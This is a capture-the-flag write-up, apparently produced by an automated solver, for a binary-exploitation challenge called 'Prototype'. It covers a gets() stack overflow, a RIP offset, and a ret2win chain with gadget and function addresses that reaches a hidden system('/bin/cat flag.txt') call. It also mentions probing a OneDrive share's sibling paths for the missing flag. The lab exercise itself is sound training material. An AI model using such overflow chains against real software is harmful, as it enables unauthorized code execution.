# Prototype Writeup

## Summary

`prototype.bin` is a small 64-bit ELF with a stack overflow in `_cp_str()`.  
The program only shows a banner in `main()`, but the binary also contains three hidden functions:

- `prototype_encrypt()`
- `prototype_write()`
- `prototype_display()`

Each hidden function increments the global `debug_increment`.  
`prototype_display()` calls `system("/bin/cat flag.txt")` only when `debug_increment == 3`.

So the solve is a ret2win chain:

`prototype_encrypt -> prototype_write -> prototype_display`

## Recon

The supplied short URL resolved to a public OneDrive folder. The folder contained a single file:

- `prototype` (downloaded locally as `prototype.bin`)

Quick triage:

```bash
file prototype.bin
strings -a prototype.bin
objdump -d -Mintel prototype.bin
```

Important findings:

- `gets` is used in `_cp_str()`
- `main()` only calls `banner()`
- `banner()` calls `_cp_str()`
- `prototype_display()` contains `system("/bin/cat flag.txt")`

## Vulnerability

`_cp_str()` allocates a 0x30-byte stack buffer and passes it directly to `gets()`:

```c
char buf[0x30];
gets(buf);
```

That gives a saved-RIP overwrite.

Offset calculation:

- buffer: `0x30` bytes
- saved `rbp`: `0x8` bytes
- saved `rip`: starts at offset `0x38`

So the RIP offset is `56`.

## Hidden Win Path

The hidden functions behave like this:

1. `prototype_encrypt()` prints `Encrypting...` and increments `debug_increment`
2. `prototype_write()` prints `Cross referencing & Writing...` and increments `debug_increment`
3. `prototype_display()` prints `Displaying...`, increments `debug_increment`, then:

```c
if (debug_increment == 3) {
    system("/bin/cat flag.txt");
}
```

## Exploit Detail

The straightforward chain crashes on x86-64 because returning directly into each function leaves the stack misaligned by 8 bytes.

The fix is to insert a plain `ret` gadget before each hidden function so each function starts with proper SysV ABI stack alignment.

Working chain:

```text
padding
ret
prototype_encrypt
ret
prototype_write
ret
prototype_display
```

Addresses:

- `ret` gadget: `0x40124e`
- `prototype_encrypt`: `0x40124f`
- `prototype_write`: `0x401384`
- `prototype_display`: `0x401427`

## Exploit Script

Saved as [solve_prototype.py](/home/kali/ctf-haven/ctf/solve_prototype.py).

Run it with:

```bash
python3 solve_prototype.py
```

## Local Verification

Running the exploit locally produces:

```text
Encrypting...
Cross referencing & Writing...
Displaying...
Verifying final check...
cat: flag.txt: No such file or directory
```

That confirms the exploit is correct and the binary reaches the intended `system("/bin/cat flag.txt")` sink.

## Flag Status

The technical exploit is complete, but the actual `flag.txt` was not present in the distributed bundle.

I also checked the public OneDrive metadata and accessible sibling paths exposed by the share token. The bundle only exposed:

- the `Prototype` folder
- the `prototype` ELF inside it

No `flag.txt`, source file, or second deployment artifact was exposed.

## Result

- Challenge: `Prototype`
- Exploit condition: solved
- Flag: not recoverable from the provided artifact alone because the deployment-side `flag.txt` is missing
